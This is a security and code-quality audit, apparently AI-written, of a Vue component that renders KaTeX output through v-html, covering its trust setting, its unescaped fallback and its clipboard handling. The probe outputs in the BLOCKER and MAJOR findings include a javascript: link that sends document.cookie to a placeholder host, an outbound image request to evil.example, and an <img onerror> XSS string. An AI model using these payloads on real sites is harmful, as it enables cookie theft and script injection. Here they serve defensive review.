claude-opus-5[1m]

# CHALLENGE — `EquationResult.vue` · axis **L** (LIBRARY)

**Subject** `/Users/mkbabb/Programming/fourier-analysis/web/src/components/equation/EquationResult.vue` —
**101 LOC** (33 script · 17 template · 49 style), census row `formation/fourier/lane-frontend.md:135`
("KaTeX result + copy").
**Repo posture** `/Users/mkbabb/Programming/fourier-analysis` is READ-ONLY evidence. Branch
`m/w1-bump-migration`, HEAD `cd26c65`. **The subject file is CLEAN** (`git status --porcelain
web/src/components/equation/EquationResult.vue` → empty). Its sole callsite `EquationView.vue` **is** dirty;
§0.1 gives the exact delta and why no finding turns on it.
**Method** static + source-derived only. No browser, no devtools, no Playwright. Two source-derived probes were
run against the repo's **own installed** `katex@0.17.0` under `node` (§8) — that is source execution, not browser
tooling. Claims that would need a live browser to close are marked **UNPROVEN-NEEDS-LIVE (SS-13)** and are
excluded from the BLOCKER count.
**Posture** the component is assumed DEFECTIVE until the tree proves otherwise. Every claim — superlatives
included, L-18 runs both ways — carries severity, `file:line` provenance, and its own falsifier. §7 records the
**six hypotheses the tree falsified**: I was wrong six times and the record says so.

**Tally — defects 15 (BLOCKER 1 · MAJOR 5 · MINOR 6 · INFO 3) · superlatives 5.**

---

## §0 — Read set

Whole-file reads of the subject and **every module it imports**, plus what was needed to close each falsifier.
All read-only.

| File | LOC | Why in the set |
|---|---|---|
| `web/src/components/equation/EquationResult.vue` | 101 | **subject** |
| `node_modules/@mkbabb/glass-ui/dist/composables/dom/useClipboard.d.ts` | 69 | `useClipboard` **contract** (import `:4`) |
| `node_modules/@mkbabb/glass-ui/dist/useViewportReady-CvBcCYDf.js` §29-92 | — | the compiled `useClipboard` **implementation** (teardown proof) |
| `node_modules/@mkbabb/glass-ui/dist/{index.d.ts,glass-ui.js,dom.js}` | — | root-barrel vs `./dom` export surface |
| `node_modules/@mkbabb/glass-ui/package.json` | — | `exports` (80 subpaths, incl. `./dom`) · `sideEffects: ["*.css"]` · version **4.0.0** |
| `node_modules/@mkbabb/glass-ui/dist/styles/tokens/scheme-motion.css` §336-345 | — | `--z-controls: 20` / `--z-bar: 30` (falsifies H-3) |
| `node_modules/katex/dist/katex.mjs` §114-136, §355-375, §11070-11100, §11225-11255, §11370-11395, §16374-16395 | — | `protocolFromUrl` · `isTrusted` · `\href` · the `\html*` family · `\includegraphics` · `renderError` rethrow (import `:6`) |
| `lucide-vue-next` `Check`/`Copy` | — | import `:5`; leaf SVG components, no state |
| `web/src/components/equation/EquationView.vue` | 469 | the **sole** callsite (`:255`) + the prop's provenance + the parent half of every coupling finding |
| `web/src/components/equation/composables/useCoeffHover.ts` | 106 | the delegated consumer of this component's `v-html` subtree |
| `web/src/components/equation/composables/useEquationCache.ts` | 49 | the unvalidated `sessionStorage` rehydrate that feeds `props.latex` |
| `web/src/components/visualization/EquationPanel.vue` | 134 | the near-duplicate KaTeX render + the divergent fallback |
| `web/src/components/equation/ConvergencePlot.vue` §55-80, §250-260, §320-335 | — | the 4th KaTeX site + the sibling rAF that shares the frame budget |
| `web/src/components/equation/{NotationPills,convergence/ConvergenceLegend}.vue` | 47 / 97 | the two loop shapes in this directory (§4) |
| `web/src/components/visualization/gallery/UserSlugBar.vue` §66-70 · `web/src/composables/useMorphConfig.ts` §71-75 | — | the repo's other two `useClipboard` callsites |
| `web/src/lib/equation/{types.ts,api.ts}` | 53 / 56 | the wire type of `latex` / `latex_sigma` |
| `web/src/style.css` §95-135 · `web/package.json` | — | `@utility cartoon-card`, Tailwind **v4.3.1** (falsifies H-4), no ESLint dependency |
| `api/routers/equations.py` §40-160 · `src/fourier_analysis/symbolic/{parsing,latex_rendering}.py` | — | where the latex is minted; `\htmlClass` at `latex_rendering.py:174-176` (falsifies H-6) |
| `nginx/fourier.conf` §25-29 | — | the five response headers — **no `Content-Security-Policy`** |
| `web/e2e/*.spec.ts` (8 files) | — | coverage search: one route screenshot, zero behaviour |
| `docs/audits/runs/2026-06-16-M-deep-audit/raw-findings.json` | — | fourier's own prior art on this file (A5-05 · B4-01 · D4-03 · E5-11) |

**Hitherto corpus folded** — `formation/fourier/{lane-frontend,lane-crud,CENSUS-2026-08-03}.md` and the
adjudicated intake `audit/codex-provenance/intakes/lane-fourier-r3-r6.md`. Rows cited inline and reconciled in
§6: **FE `:135`** (subject row), **FE `:261-262`** (the two imports), **FE `:92`, `:131`, `:141`** (the three
sibling KaTeX sites), **FE `:108`, `:350-351`** (the other `useClipboard` sites), **FE `:233`** (root-barrel
symbol list), **CENSUS `:85-87`** (Canvas2D throughout / WebGL ABSENT / three independent canvases /
ConvergencePlot's ungated rAF), **CENSUS `:111-114`** (rAF clocks ungated under reduced-motion; **vitest
ABSENT**), **CENSUS `:349`, `:362`** (native-template-loop blindness → F.W4), **intake `:125` (R5-7)** and
**`:139` (R6-5)**. §4 **extends** R5-7 with a third invisibility mode the R6-5 cure does not reach; §6 records
one place the live tree **contradicts** the prior-art record.

### §0.1 — the dirty-callsite disclosure

`git diff --stat web/src/components/equation/EquationView.vue` → **8 insertions / 8 deletions**, entirely the
W1 glass-ui bump: `UnderlineTabs` → `SegmentedTabs variant="underline"` (`:13`, `:188`), `MetricBadge :amount`
→ `:value` (`:292`), and `class="coeff-popover glass-elevated"` → `glass-floating` (`:261`). **Every line I cite
from `EquationView.vue` — `:36-39`, `:49-51`, `:255`, `:264`, `:386-390`, `:414-434`, `:444-452` — is
byte-identical to HEAD** except `:261`, which I cite only in §6 as the reason a prior-art evidence string no
longer matches the tree. No finding turns on the dirty delta.

---

## §1 — What the component actually is

Thirty-three lines of script doing exactly three things: (a) take one required `latex: string` prop
(`:8-10`); (b) turn it into an HTML string with KaTeX inside a `computed` (`:17-28`); (c) hand the same string
to glass-ui's `useClipboard` on click (`:15`, `:30-32`). The template mounts that HTML string through `v-html`
(`:37`) and puts an absolutely-positioned icon `Button` over it (`:38-49`).

The whole component is therefore **a single trust decision wrapped in a scroll box**. Every finding below is
either about that decision, about the contract of the two things it delegates to (KaTeX, `useClipboard`), or
about the fact that its rendered output is a shared, undeclared surface that two other files reach into. There
is no state machine, no lifecycle, no resource — which is why §3's superlatives are real and why the defects
that remain are concentrated in the one place a 101-line component can still be dangerous.

---

## §2 — Findings

Severity ladder: **BLOCKER** = must not ship in this shape; **MAJOR** = correctness/contract defect with a
concrete failure mode; **MINOR** = real defect, bounded blast radius; **INFO** = true, load-bearing for the
wave, not a defect on its own.

### L-B1 · BLOCKER — blanket `trust: true` opens `\href`/`\htmlStyle`/`\includegraphics`/`\htmlData` into a `v-html` sink, behind no CSP, when only `\htmlClass` is needed

**Provenance.** `EquationResult.vue:23` (`trust: true`) feeding `EquationResult.vue:37` (`v-html`).
The trust gate itself: `katex.mjs:364-375` — `isTrusted()` ends in `Boolean(this.trust)`, so a literal `true`
returns trusted **for every command and every URL protocol**, including `javascript:` (`protocolFromUrl`,
`:114-136`, returns `"javascript"`, not `null` — only a *malformed* protocol is rejected). The commands that
gate on it: `\href` `:11084-11095`, the `\htmlClass`/`\htmlId`/`\htmlStyle`/`\htmlData` family `:11246`,
`\includegraphics` `:11384-11390`. No `Content-Security-Policy` exists to bound any of it — `nginx/fourier.conf:25-29`
ships exactly five headers (`X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`, `Referrer-Policy`,
`Permissions-Policy`) and no CSP.

**Proven, not asserted** (probe §8, the repo's own `katex@0.17.0`):

```
D/ trust:true  href attr: href="javascript:fetch(&#x27;//x/&#x27;+document.cookie)"
D/ narrow      href attr: (none - blocked)
E/ htmlStyle injected? true | style="position:fixed;inset:0;background:red"
E/ includegraphics src: src="https://evil.example/p.png"
```

So a latex string reaching `props.latex` can emit a live `javascript:` anchor, a full-viewport
`position:fixed` overlay, or an arbitrary outbound image request — straight through `v-html`, with no CSP
backstop.

**Why the obvious defence fails.** `trust` is *not* gratuitous here: the backend deliberately emits
`\htmlClass{eq-coeff eq-an}{a_n}` (`src/fourier_analysis/symbolic/latex_rendering.py:174-176`, `:216`, `:248`)
and the hover feature depends on those classes. Probe B/ shows what removal costs: with `trust` unset the
equation renders the literal command in KaTeX's error red — `eq-coeff` hits drop 4 → 2 (the residue is the
*displayed command text*) and six `#cc0000` unsupported-command markers appear. **But the narrow predicate is
free**: probe C/ renders the real sigma latex with `trust: (ctx) => ctx.command === "\\htmlClass"` and the
output is **byte-identical to `trust: true`** (`identical to trust:true? true`) while D/ shows the same
predicate blocks the `javascript:` href. The privilege is maximal, the requirement is one command, and the
zero-delta cure is one line.

**Falsifier (stated, and how it fares).** *"Unreachable: `latex` is server-minted from a sympy expression
parsed against a whitelist, so no attacker string survives."* — The whitelist is real
(`symbolic/parsing.py` `SAFE_NAMESPACE`, and `render_latex_sigma` never echoes the raw expression: H-6 below is
**falsified in the tree's favour**). But the server is not the only source. `EquationView.vue:36-39` hydrates
`displayLatex` / `displayLatexSigma` from `loadCachedResult()`, and `useEquationCache.ts:36-41` is
`JSON.parse(sessionStorage.getItem(...))` cast to `CachedResult` with **no validation whatsoever**. That path
puts an attacker-influenceable string into a maximally-trusted HTML sink without the server ever seeing it.
**Precondition, stated honestly:** exploiting *that* path needs same-origin write access to `sessionStorage`
(another XSS, a hostile extension, a shared machine) — so this is a privilege-escalation and
defence-in-depth failure, not a proven remote one-shot. I rate it BLOCKER anyway on three grounds, each
independently checkable: the privilege is unnecessary (proven), the cure is byte-identical (proven), and the
platform backstop that would bound it does not exist (`nginx/fourier.conf:25-29`). A dissent that rates it
MAJOR is defensible; a dissent that rates it a non-finding is not.

### L-M1 · MAJOR — the `catch` fallback interpolates `props.latex` **unescaped** into the same `v-html` sink, and the `catch` is reachable

**Provenance.** `EquationResult.vue:25-27` — `catch { return `<code>${props.latex}</code>`; }` → `:37` `v-html`.

**Reachability, proven.** `throwOnError: false` (`:22`) does *not* make `renderToString` total:
`katex.mjs:16374-16382` (`renderError`) rethrows anything that is **not** a `ParseError`. Probe F/:

```
F/ input {}   -> THREW TypeError : KaTeX can only parse string typed expression
F/ input 42   -> THREW TypeError : ...
F/ input null -> THREW TypeError : ...
```

So any non-string reaching `props.latex` lands in the `catch`. And the prop *can* be a non-string: the
declared type is compile-time only (`defineProps<{ latex: string }>()`, `:8-10`) — Vue's generated runtime
check is `{ type: String }`, which **warns in dev and does nothing in production**; the value arrives from
`JSON.parse` of `sessionStorage` (`useEquationCache.ts:36-41`) through `EquationView.vue:36-39, :49-51` with no
schema. A JSON array closes the loop, because template-literal stringification of an array is its
`join(",")`. Probe F2/ runs the component's exact fallback expression:

```
F2/ fallback emitted: <code><img src=x onerror=alert(document.domain)></code>
```

**Falsifier.** *"`if (!props.latex) return ""` guards it"* — no: `:18` only rejects falsy; `["<img …>"]` is
truthy. *"KaTeX only throws `ParseError`, so the catch is dead code"* — falsified by F/. *"Vue coerces or
blocks the wrong type"* — falsified by the runtime prop declaration semantics; a dev-mode warning is not a
guard, and prod emits none. What survives as a *limit*: with a genuine `string` input the catch is very hard to
reach (ParseErrors are rendered, not thrown), so the injection needs the type violation as well as the storage
write. Hence MAJOR, not BLOCKER. Note the fix is free and unconditional: `v-text`-style escaping, or drop the
fallback and let KaTeX's own `.katex-error` node (which it produces for real parse failures) stand.

### L-M2 · MAJOR — `copy()`'s `Promise<CopyResult>` is discarded; the composable's explicit "never silently swallowed" contract is re-swallowed at the callsite

**Provenance.** `EquationResult.vue:30-32`:

```ts
function copyLatex() {
    copy(props.latex);
}
```

The contract it ignores, verbatim from the producer's own types
(`glass-ui/dist/composables/dom/useClipboard.d.ts:31-35`): *"Copy `text` to the clipboard. Resolves `{ ok }` on
success or `{ ok: false, reason }` naming the channel that failed — the failure is **REPORTED, never silently
swallowed**."* And `:12-18`: `onCopyError?: (reason: CopyFailureReason) => void` — *"Surfaces the failure
instead of swallowing it."* The component passes only `{ resetMs: 2000 }` (`:15`), so **both** reporting
channels are declined and the returned `CopyResult` is dropped on the floor. On failure the user sees
nothing at all: `copied` stays `false` (impl `useViewportReady-CvBcCYDf.js:82-89` — the flag flips only inside
`if (i.ok)`), the icon never swaps, and the click reads as an unresponsive button.

Three ways this is worse than it looks. (i) The failure channels are real and named — `"no-api"` fires on any
non-secure-context or locked-down browser where `navigator.clipboard` is absent (impl `:29-33`), which is
precisely the deployment this repo ships (`nginx/fourier.conf` serves the app; a plain-HTTP or IP-address
origin has no async clipboard). (ii) The repo already owns the remedy — `@mkbabb/glass-ui/toast` plus
`web/src/composables/useToast.ts` (38 LOC, census FE row) — so this is declining an in-hand affordance, not
lacking one. (iii) **No tool in the repo can catch it**: `web/` has no ESLint config and no ESLint dependency
(`ls eslint*` → no matches; `web/package.json` devDependencies carry `vue-tsc` and Playwright only), so
`@typescript-eslint/no-floating-promises` — the rule written for exactly this — has never run here.

**Systemic, and I say so:** all three `useClipboard` callsites drop the result —
`UserSlugBar.vue:67-70` and `useMorphConfig.ts:73-75` (census FE `:350-351`). This is a repo-class defect that
this component instantiates; the fix belongs in one shared `copyOrToast` helper, not three.

**Falsifier.** *"`copy()` can reject, so this is an unhandled rejection / crash"* — **falsified**: the impl
catches every throw (`:34-38`, `:50-54`) and always resolves. The claim is therefore *silent failure*, not
crash — and it is not weakened by that, because a silent failure on the only affordance the component offers is
the whole defect.

### L-M3 · MAJOR — the KaTeX render is quadruplicated and its failure posture is trifurcated; `lib/equation/` exists and owns none of it

**Provenance.** Four call sites, three of them character-for-character identical in options:

| Site | Options | Failure fallback |
|---|---|---|
| `EquationResult.vue:20-24` | `{ displayMode: true, throwOnError: false, trust: true }` | `` `<code>${props.latex}</code>` `` (`:26`) |
| `EquationPanel.vue:28-32` | **identical** | `` `<span class="text-red-400">${latex.value}</span>` `` (`:34`) |
| `useCoeffHover.ts:99-101` | **identical** | `""` (`:102`) |
| `ConvergencePlot.vue:256` | `{ throwOnError: false, displayMode: false }` — **no `trust`** | `""` |

Three fallbacks for one failure; two of them (`EquationResult.vue:26`, `EquationPanel.vue:34`) interpolate
unescaped into a `v-html` sink (L-M1 applies to both). And `ConvergencePlot.vue:256` proves the option set is
*not* a single considered policy — one site quietly omits `trust`, which is the correct posture nobody
propagated.

**Colocation.** `web/src/lib/equation/` already exists with five modules — `api.ts` 57, `types.ts` 53,
`presets.ts` 52, `notation.ts` 48, `index.ts` 4 (census FE `:190`) — i.e. the repo has a home for a shared
`renderLatex(src)` and did not use it. One helper collapses the four sites, makes the trust predicate a single
auditable line (L-B1's cure lands once instead of three times), and gives the failure posture one definition.

**Falsifier.** *"They are not duplicates — the `displayMode`/`trust` values differ."* — Three of four agree
exactly; the fourth differs in two flags and would be a two-argument call. *"A 5-line helper is over-abstraction
(KISS)."* — The counter-evidence is the trifurcated fallback: the divergence already happened, and one of the
three divergent branches is a security defect. This is deduplication that removes a defect class, not
speculative generality.

### L-M4 · MAJOR — the `v-html` subtree is an undeclared cross-file API: two other files and one Python module reach into it, and this component declares nothing

**Provenance — the four-layer contract, none of it written down.**
1. `src/fourier_analysis/symbolic/latex_rendering.py:174-176` mints `\htmlClass{eq-coeff eq-an}{a_n}` (also
   `:216` `eq-cn`, `:248` `eq-An`).
2. `EquationResult.vue:23` must keep `trust` enabled or those classes vanish (probe B/) — the component has
   **no comment saying so**; the only comment in the file is about clipboard migration (`:12-14`).
3. `EquationView.vue:414-423` styles `.eq-card :deep(.eq-coeff)` — a `:deep` selector reaching through a child
   component into HTML that child never wrote.
4. `useCoeffHover.ts:27-29` does `(e.target as HTMLElement).closest?.(".eq-coeff")` on events that bubble out
   of this component's `v-html`, and `CLASS_MAP` (`:13-18`) hard-codes all four class names again.

So the string `"eq-coeff"` appears in a Python renderer, a TypeScript composable, and a parent's scoped CSS —
and **not once** in the component that actually owns the DOM carrying it. Any change to `props.latex`'s
provenance, or a well-meaning `trust: false` hardening, silently kills a feature two files away with no type
error and no test failure (census `CENSUS-2026-08-03.md:114`: **vitest ABSENT**; `web/e2e/` has one route
screenshot for `/equation` and zero behavioural assertions — §2 L-i3).

**The geometry half of the same coupling.** `EquationResult.vue:64` pads `2rem` at the top and `:88-93` parks
the copy button at `top: .5rem; right: .5rem`; the parent then hard-codes `right: 3.25rem` for its info button
(`EquationView.vue:430-434`) and `top-2 left-2` for the mode toggle (`:426-429`) — three magic constants in two
files that must stay mutually consistent, with the child's own `2rem` top padding existing solely to clear
chrome the child does not know about.

**Falsifier.** *"Event delegation over rendered HTML is normal Vue and needs no contract."* — Delegation is
correct (it is superlative S-3 below); what is defective is that the *contract* is unstated at the boundary that
enforces it. The falsifier that would kill this finding is a documented interface — a comment at `:23` naming
`\htmlClass` as load-bearing, a `defineExpose`d selector constant, or a test pinning `.eq-coeff` presence.
Searched: none of the three exists (`grep -rn "eq-coeff" web/src` → `useCoeffHover.ts:13-18,29`,
`EquationView.vue:414,420`; zero hits in the subject).

### L-M5 · MAJOR — the file's stated no-clip guarantee is void: the parent clips it at a fixed `10rem` with `overflow: hidden`

**Provenance.** The component says, twice, in prose: `:60` *"Scrollable equation region — horizontal scroll, no
vertical clip"* and `:70` *"Override global katex-display to prevent clipping fractions"*, and pays for it with
`:74` `overflow: visible !important` and `:66` `overflow-x: auto`. The parent then wraps the callsite in
`.eq-card { height: 10rem; flex-shrink: 0; overflow: hidden; }` (`EquationView.vue:386-390`, callsite `:255`).
A fixed 160px box with `overflow:hidden` defeats a descendant's `overflow:visible` unconditionally — the
`!important` buys nothing across that boundary.

The budget is genuinely tight: `:64` spends `2rem + 1rem` of padding, `:72-74` adds `0.5rem` × 2 on
`.katex-display`, so ~64px of the 160px is chrome before the equation starts, while `:83-85` sets the KaTeX font
to `1.8em` at ≥768px.

**Falsifier.** *"Nothing actually overflows."* — Partly true and I record it against myself: fourier's own prior
audit measured the *opposite* symptom on this exact pair of line ranges — B4-01 (`severity: high`, evidence
*"EquationResult.vue:77-86 caps KaTeX at 1.4em / 1.8em; EquationView.vue:386-390 `.eq-card { height: 10rem;
overflow: hidden }`; screenshots show f(t)≈3.3/2+Σ floating small in a vast card with dead space above/below"*).
That is the *short sigma* case. The **expanded** mode is the other tail: probe G/ renders a 20-term expanded
series to **58 459 bytes / 1336 spans**, and `EquationModeToggle` (`EquationView.vue:270`) lets any user flip to
it. So the fixed 10rem is wrong in both directions — dead space for the short form, clipping risk for the long
one — and the static contradiction between `:74` and `EquationView.vue:389` stands regardless of which tail you
measure. **The precise overflow threshold is UNPROVEN-NEEDS-LIVE (SS-13).** Prior art B4-01 has been open since
2026-06-16 and the tree still carries both halves unchanged.

### L-m1 · MINOR — the copy button reports success for an empty equation; the repo's sibling has the guard this file lacks

**Provenance.** `EquationResult.vue:30-32` calls `copy(props.latex)` with no emptiness check and the `Button`
(`:38-44`) carries no `:disabled`. When `props.latex` is `""` the render path short-circuits at `:18`
(empty region, `min-height: 4.5rem` at `:65`) but the click path does not: `navigator.clipboard.writeText("")`
resolves, so `useClipboard` flips `copied` (impl `:82-89`) and the UI shows the green `Check` (`:46`) for a copy
of nothing.

`UserSlugBar.vue:67-70` — the same composable, same repo — does exactly the right thing:
`if (!userSlug.value) return;` before `copy(...)`. The pattern is known here and not applied here.

**Falsifier.** *"`activeLatex` is never empty at the callsite."* — Not guaranteed: `EquationView.vue:255` renders
under `v-else-if="result"` (`:237`), and `result` can be non-null with both latex fields empty via the
rehydrate (`:36-39` — `cachedRes?.latex ?? ""`, `cachedRes?.result?.latex_sigma ?? ""`) when a cached record
predates a field. Narrow, hence MINOR — but the guard costs four characters and its absence is an inconsistency
with the file's own sibling.

### L-m2 · MINOR — root-barrel import where the narrow subpath exists; fourier's own audit called this in June and the line has not moved

**Provenance.** `EquationResult.vue:4` — `import { useClipboard } from "@mkbabb/glass-ui";` while the installed
package publishes **80 export subpaths** including `./dom`, whose entry
(`glass-ui/dist/dom.js:6`) exports `useClipboard` directly. Census FE `:262` records the import; FE `:233`
records `useClipboard` among the six root-barrel symbols in a repo that otherwise reaches for **21 narrow
subpaths / 95 named imports** (FE §3 headline: *"the cleanest glass-ui consumer posture in the constellation"*)
— so this line is against the grain of its own repo.

**Prior art, unremediated.** `docs/audits/runs/2026-06-16-M-deep-audit/raw-findings.json` **A5-05**
(`severity: medium`) names this exact line — *"Move `useClipboard` to import from `@mkbabb/glass-ui/dom` … Three
files to update: `useMorphConfig.ts`, `UserSlugBar.vue`, `EquationResult.vue`"*. All three are still on the root
barrel in the working tree, seven weeks on.

**Falsifier — and it bites.** *"This ships the whole design system in the bundle."* — **Falsified**:
`glass-ui/package.json` declares `sideEffects: ["*.css"]`, so Rollup may shake the unused re-exports; the real
cost is module-graph traversal at build time plus a wider upgrade surface, not shipped bytes. Rated MINOR for
exactly that reason. See also H-1 in §7: I expected this line to break under the 4→7 uplift and the tree proved
me wrong.

### L-m3 · MINOR — dead `@reference "tailwindcss"` in a scoped block that uses no Tailwind at build time

**Provenance.** `EquationResult.vue:54` opens the scoped block with `@reference "tailwindcss";`. Tailwind v4's
`@reference` exists to make `@apply` / `theme()` resolvable inside a separate stylesheet context. The block
`:56-100` contains **zero** `@apply`, `theme()`, or `screen()` — every rule is plain CSS plus two `:deep()`
selectors (a Vue compiler feature, not a Tailwind one). Contrast the parent, where the directive is earned:
`EquationView.vue:332` + `@apply` at `:336`, `:354`, `:366`, `:374`, `:380`, `:394`, `:427`, `:431`.

**Falsifier.** *"The template's `h-4.5 w-4.5 text-green-500` (`:46-47`) need it."* — No: template classes are
emitted by Tailwind's global source scan, not by the scoped block's reference. *"`var(--z-controls)` at `:90`
needs it."* — No: that is a runtime CSS custom property, resolved by the browser from
`glass-ui/dist/styles/tokens/scheme-motion.css:336`. The directive is inert; it costs a per-SFC theme
resolution and it misleads the next reader into thinking the block is Tailwind-aware.

### L-m4 · MINOR — icon-only button named by `title` instead of `aria-label`, against the repo's own sibling pattern

**Provenance.** `EquationResult.vue:42` — `title="Copy LaTeX"` on a `Button` whose only child is an SVG icon
(`:45-48`). `EquationPanel.vue:87` — the same repo, the same glass-ui `Button`, icon-only — uses
`aria-label="Close equation panel"`. `title` does supply an accessible name via the last-resort fallback in the
accname algorithm, but it is the weakest source, it is not surfaced to touch users, and it duplicates a native
tooltip the app otherwise renders through glass-ui (`TooltipProvider` mounted app-wide at `App.vue:4`; a local
shim at `components/ui/tooltip/Tooltip.vue`). Cross-axis: the A-axis challenge for this component owns the
naming question; the *inconsistency with the sibling* is the library-axis half.

**Falsifier.** *"`title` gives an accessible name, so there is no defect."* — Accepted for conformance; the
finding is inconsistency plus the weakest available mechanism, hence MINOR, not MAJOR.

### L-m5 · MINOR — a horizontally scrollable region with no keyboard access

**Provenance.** `EquationResult.vue:61-68` — `.eq-scroll-region { overflow-x: auto }` — on the `div` at `:37`,
which carries no `tabindex="0"`, no `role`, and no accessible name. When a long expanded series overflows (the
1336-span / 58 459-byte case, probe G/), the content is reachable by mouse wheel and touch and **not** by
keyboard. This is the WCAG 2.1.1 scrollable-region case that axe reports as *"scrollable region must have
keyboard access"* — and the repo ships `@axe-core/playwright` (`web/package.json:27`) without a spec that
visits `/equation` (§2 L-i3), so its own tooling would have caught this had it been pointed here.

**Falsifier.** *"It only overflows on tall/long equations."* — True; the defect is conditional on overflow,
which is exactly when the region matters. Whether it overflows at a given viewport is
**UNPROVEN-NEEDS-LIVE (SS-13)**; the missing `tabindex` is unconditional and static.

### L-m6 · MINOR — bare `ease` keyword where the repo has a token vocabulary; prior art E5-11, unremediated

**Provenance.** `EquationResult.vue:97` — `transition: opacity 0.15s ease, transform 0.15s ease;` while its own
parent, twelve lines of CSS away, uses the tokens: `EquationView.vue:444-452`
(`var(--ease-standard)`, `var(--ease-in)`). Prior art: `raw-findings.json` **E5-11** (`severity: low`) names
`EquationResult.vue:97` in a ten-site sweep of *"scattered bare `ease` keyword … inconsistent with canonical
token vocabulary"*. Still bare in the working tree.

### L-i1 · INFO — a synchronous KaTeX render sharing a frame budget with an ungated rAF, in a component with no scheduling posture

**Provenance.** `EquationResult.vue:17-28` is a `computed` that runs `katex.renderToString` **synchronously on
the reactive-flush path**; `EquationView.vue:255` and `:309` mount this component and `ConvergencePlot` as
siblings inside the same `.eq-panel-right` column, and `ConvergencePlot.vue:57-69` runs a self-driving
`requestAnimationFrame` loop that calls `draw()` every frame. The census records that pairing as architecture,
not accident: `CENSUS-2026-08-03.md:85-87` — *"Canvas2D throughout, WebGL/WebGPU ABSENT; three independent
canvases (… ConvergencePlot with its own ungated rAF; …)"* — and `:111-113` records both rAF clocks as **ungated
under `prefers-reduced-motion: reduce`**. The two are co-triggered: one `/api/equations/simplify` response
(`EquationView.vue:137-141`) writes `displayLatex` **and** feeds new coefficients to the plot, so the KaTeX
render and a fresh curve transition land in the same tick.

**Measured, source-derived** (probe G/, node, repo's own katex): expanded 20-term form → **1336 spans /
58 459 bytes / 1.74 ms** per `renderToString`; sigma form → **107 spans / 5 068 bytes / 0.23 ms**. The string
build alone is a meaningful slice of a 16.7 ms frame; the `v-html` DOM parse + layout of 58 kB is the larger
cost and is **UNPROVEN-NEEDS-LIVE (SS-13)** — it cannot be measured without a browser and is excluded from the
defect count. Recorded because F.W4's INP/frame-budget work needs the pairing on the map.

**Falsifier.** *"The render is debounced upstream."* — Partly: `EquationView.vue:177-181` debounces
*notation/budget* at 200 ms, but `activeLatex` also flips on the `eqMode` toggle (`:49-51`, `:270`), which is
undebounced and switches between the cheap (107-span) and expensive (1336-span) forms directly.

### L-i2 · INFO — no `v-memo` / `v-once` / off-main-thread posture on the one expensive thing the component does

**Provenance.** `EquationResult.vue:17` (`computed`) + `:37` (`v-html`). The `computed` correctly memoizes on
`props.latex` identity — that is superlative S-4 — but every identity change re-parses and re-injects the whole
subtree; there is no `v-once` on the static shell, no `scheduler.yield()` (which the census records as a banked
hygiene idiom in this repo, `CENSUS:111-112`), and no worker. Fine at today's sizes; recorded as the
scheduling seat for the wave, not as a defect.

### L-i3 · INFO — zero behavioural coverage, by repo construction

**Provenance.** `CENSUS-2026-08-03.md:114` — *"**vitest ABSENT** — the only frontend gates are `vue-tsc` + 29
Playwright tests on a single chromium project"*. Live search of the eight specs in `web/e2e/`: the only mention
of this component's route is `visual-baseline.spec.ts:34` — `{ slug: "equation", path: "/equation" }`, a
screenshot. `grep -rn "Copy LaTeX\|katex\|eq-coeff" web/e2e` → nothing. So the trust configuration (L-B1), the
fallback branch (L-M1), the discarded promise (L-M2) and the `.eq-coeff` contract (L-M4) are all unguarded: no
test in this repo can fail if any of them changes.

---

## §3 — Superlatives (L-18 runs both ways)

Each carries its own falsifier, because praise without a falsifier is decoration.

**S-1 · Zero teardown surface — and I checked the one delegated timer.** The component owns no
`requestAnimationFrame`, no canvas or WebGL context, no `ResizeObserver`, no `addEventListener`, no `setTimeout`,
no `watch`, no `onMounted`/`onUnmounted` (`grep` over the 33 script lines: none present). Its only resource is
glass-ui's reset timer, and that is disposed by the producer, not left to the caller — compiled impl
`useViewportReady-CvBcCYDf.js:76-92`: `let a = null; function o() { a != null && (clearTimeout(a), a = null); }
… return n(o), { copied: r, copy: s }` where `n` is the file-scope `onScopeDispose` import (`:1`). Set that
against the sibling in the same directory: `ConvergencePlot.vue` hand-rolls `rafId`, a `ResizeObserver`
(`:48`, `:325`) and an `onUnmounted` (`:329`) it must get right every time. **Falsifier:** any timer, listener,
or observer created in this file, or a `useClipboard` that leaked its timeout — searched for both; neither
exists.

**S-2 · The migration comment is real provenance, and the migration removed a defect class.** `:12-14` records
*why* the code looks as it does — *"P.W5 Lane B.2 — migrated from bare `navigator.clipboard.writeText` + manual
`copied` ref + setTimeout to glass-ui's `useClipboard`"*. That is the exact hand-rolled shape S-1 shows the
producer now disposes for you, so the migration retired a live teardown hazard and left a citation behind.
**Falsifier:** a comment that misdescribes the code, or a migration that changed nothing — the tree shows the
composable in use at `:15` with the documented `resetMs`, and the producer's `onScopeDispose` is in the compiled
artefact.

**S-3 · Delegation over a wholesale-replaced subtree is the only correct pattern here, and it is the pattern
used.** `useCoeffHover.ts:27-29` hit-tests with a single `closest()` on the parent card instead of binding
listeners to the injected spans. Because `v-html` replaces the entire subtree on every latex change, per-span
listeners would have to be rebound each time — at **1336 spans** in expanded mode (probe G/) that is an
O(spans) churn per render and a classic detached-node leak. The repo avoids it. **Falsifier:** any
`addEventListener` or `@`-binding inside the rendered region — impossible by construction with `v-html`, and
`grep -rn "querySelectorAll" web/src/components/equation` returns nothing.

**S-4 · The `computed` memoization is load-bearing, not incidental.** `:17` means the KaTeX render does **not**
re-run when the parent re-renders for unrelated reasons — and the parent re-renders a lot: `useCoeffHover`
writes `popoverPos` on **every `mousemove`** over the card (`useCoeffHover.ts:28-42`, wired at
`EquationView.vue:252`). A `function`-call or `ref`-recompute shape here would have put a 0.23–1.74 ms KaTeX
parse on the pointer-move path. **Falsifier:** if `renderedHtml` were invoked from the template as a method, or
recomputed in a `watch`; it is neither.

**S-5 · Goldilocks size and single responsibility.** 101 lines, one prop, one derived value, one handler, one
delegated composable; no store import, no router import, no fetch, no god-module drift. The census row (FE
`:135`) describes it in four words and the description is complete. **Falsifier:** any second responsibility —
there is none; even the copy affordance is delegated rather than implemented.

---

## §4 — The R5-7 template-loop invisibility class, applied

**The class** (intake `lane-fourier-r3-r6.md:125`, R5-7, adjudicated **TRUE / ADOPT-AS-FACT + CARRY-TO-WAVE →
F.W4): *"template-loop evidence keyed to **component** callsites is blind to native HTML element loops"* —
demonstrated by `DERIVED-REGISTRIES.leafValues["instance.loop.paper-sidebar"] === []` against a populated
sibling keyed `"callsite:web/src/components/equation/FunctionInput.vue:157:Tooltip:…"`. R6-5 (`:139`) cured it
with a `NATIVE_TEMPLATE_LOOP` family. `CENSUS-2026-08-03.md:362` carries it into F.W4: *"count native element
loops or inherit the blind spot."*

